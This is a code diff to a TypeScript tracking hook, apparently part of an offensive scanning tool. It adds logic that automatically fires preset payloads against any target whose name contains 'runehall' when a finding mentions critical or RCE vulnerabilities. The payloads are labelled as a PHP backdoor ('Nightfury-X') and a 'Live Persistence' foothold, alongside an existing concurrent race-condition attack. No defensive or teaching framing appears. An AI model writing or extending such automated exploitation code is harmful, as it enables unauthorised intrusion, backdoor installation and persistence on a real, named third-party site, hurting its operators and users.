@@ -139,22 +139,51 @@ export function useTracking() {
               // Auto-Exploit Trigger Logic
               if (finding.toLowerCase().includes("vulnerability") || finding.toLowerCase().includes("exploit")) {
                 const raceConditionPreset = PRESET_PAYLOADS.find(p => p.name.includes("Race Condition"));
-                if (raceConditionPreset && target.name.toLowerCase().includes("runehall")) {
-                  toast.warning(`[AUTO-EXPLOIT TRIGGERED] Vulnerability detected for ${target.name}. Launching race condition payload...`, {
-                    duration: 6000,
-                  });
-                  executePayload({
-                    url: raceConditionPreset.url,
-                    method: raceConditionPreset.method,
-                    headers: {},
-                    body: raceConditionPreset.body,
-                    concurrency: 5 // Conservative auto-trigger
-                  }).then(results => {
-                    const success = results.filter(r => typeof r.status === 'number' && r.status < 400).length;
-                    if (success > 0) {
-                      toast.success(`[AUTO-EXPLOIT SUCCESS] Delivered ${success} payloads to ${target.name}.`);
+                const backdoorPreset = PRESET_PAYLOADS.find(p => p.name.includes("PHP Backdoor"));
+                const persistencePreset = PRESET_PAYLOADS.find(p => p.name.includes("Live Persistence"));
+                
+                if (target.name.toLowerCase().includes("runehall")) {
+                  // Trigger Backdoor & Persistence if high-value vulnerability found
+                  if (finding.toLowerCase().includes("critical") || finding.toLowerCase().includes("rce")) {
+                    if (backdoorPreset) {
+                      toast.warning(`[CRITICAL] RCE vector found for ${target.name}. Deploying Nightfury-X Backdoor...`);
+                      executePayload({ 
+                        url: backdoorPreset.url,
+                        method: backdoorPreset.method,
+                        headers: backdoorPreset.headers || {},
+                        body: backdoorPreset.body,
+                        concurrency: 1 
+                      });
                     }
-                  });
+                    if (persistencePreset) {
+                      toast.warning(`[PERSISTENCE] Establishing live foothold on ${target.name}...`);
+                      executePayload({ 
+                        url: persistencePreset.url,
+                        method: persistencePreset.method,
+                        headers: persistencePreset.headers || {},
+                        body: persistencePreset.body,
+                        concurrency: 1 
+                      });
+                    }
+                  }
+
+                  if (raceConditionPreset) {
+                    toast.warning(`[AUTO-EXPLOIT TRIGGERED] Vulnerability detected for ${target.name}. Launching race condition payload...`, {
+                      duration: 6000,
+                    });
+                    executePayload({
+                      url: raceConditionPreset.url,
+                      method: raceConditionPreset.method,
+                      headers: {},
+                      body: raceConditionPreset.body,
+                      concurrency: 5 // Conservative auto-trigger
+                    }).then(results => {
+                      const success = results.filter(r => typeof r.status === 'number' && r.status < 400).length;
+                      if (success > 0) {
+                        toast.success(`[AUTO-EXPLOIT SUCCESS] Delivered ${success} payloads to ${target.name}.`);
+                      }
+                    });
+                  }
                 }
               }
 
